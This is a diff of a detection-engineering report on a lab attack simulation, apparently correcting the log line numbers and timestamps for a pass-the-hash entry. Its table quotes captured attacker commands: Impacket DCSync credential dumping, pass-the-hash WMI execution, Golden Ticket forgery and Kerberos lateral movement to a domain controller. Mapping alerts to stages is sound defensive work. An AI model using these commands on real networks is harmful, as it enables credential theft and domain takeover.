@@ -87,7 +87,7 @@ During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV data 
 > **Forensic Accounting Note on Line Numbers & User Attribution:**  
 > - **File Lines vs. Data Rows:** The numbers cited in the table below reference the **raw file line numbers** in `Wazuh-Raw-Alerts.csv`. Because Line 1 contains the CSV column headers, each data row is exactly `File Line - 1` (e.g., File Line 9139 is Data Row 9138).
 > - **User `root (33)` Attribution:** For file lines 9139, 9144, and 9148 (`stty sane`, `export TERM=xterm`, `sudo -l`), the log displays `user:root` with `uid:33`. This occurs because the interactive reverse shell executed under Apache service account `www-data` (UID 33) inherited `USER=root` from the system environment/subshell template while `id -u` accurately reported effective UID 33. Following GTFOBins sudo elevation in Stage 07, subsequent commands report `user:root` with `uid:0`.
-> - **Pass-the-Hash Execution Timing:** The initial Stage 15 `wmiexec.py` execution occurred at **Data Row 9300 / File Line 9301** (`18:04:49 IST`), followed by secondary invocation testing at `18:06:26 IST` (File Line 9304 records DC-side privilege checks prior to Golden Ticket forgery).
+> - **Pass-the-Hash Execution Timing:** The initial Stage 15 remote WMI execution occurred across **Data Rows 9296–9300 / File Lines 9297–9301** (`18:04:47–18:04:49 IST`), with the pivot host's verbatim bash command captured at **Data Row 9303 / File Line 9304** (`18:05:57 IST`).
 
 | Raw File Line | Data Row | Timestamp (IST) | User (UID) | Working Dir | Verbatim Command Captured | Associated Attack Stage |
 |:---:|:---:|:---:|:---:|:---|:---|:---|
@@ -111,7 +111,7 @@ During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV data 
 | **9274** | 9273 | `18:02:40` | root (0) | `/tmp` | `python3 /usr/local/bin/secretsdump.py ad.lab/HANK_SHERMAN:'Password123'@192.168.56.10 -outputfile /tmp/dcsync_output` | Stage 14: DCSync NTDS Password Replication |
 | **9276** | 9275 | `18:02:49` | root (0) | `/tmp` | `cat /tmp/dcsync_output.ntds` | Stage 14: Dumped Hashes Verification |
 | **9286** | 9285 | `18:04:15` | root (0) | `/tmp` | `python3 /usr/local/bin/lookupsid.py ad.lab/HANK_SHERMAN:'Password123'@192.168.56.10 \| grep "Domain SID"` | Stage 16: Domain SID Discovery for Golden Ticket |
-| **9301** | 9300 | `18:04:49` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.10` | Stage 15: Pass-the-Hash Lateral Movement |
+| **9304** | 9303 | `18:05:57` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.10` | Stage 15: Pass-the-Hash Lateral Movement |
 | **9306** | 9305 | `18:06:40` | root (0) | `/tmp` | `python3 /usr/local/bin/ticketer.py -nthash 611a8... -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator` | Stage 16: Golden Ticket Forgery (krbtgt KVNO 3) |
 | **9307** | 9306 | `18:06:48` | root (0) | `/tmp` | `export KRB5CCNAME=/tmp/Administrator.ccache` | Stage 16: Kerberos Cache Initialization |
 | **9373** | 9372 | `18:14:50` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 17: Golden Ticket Lateral WMI to DC |
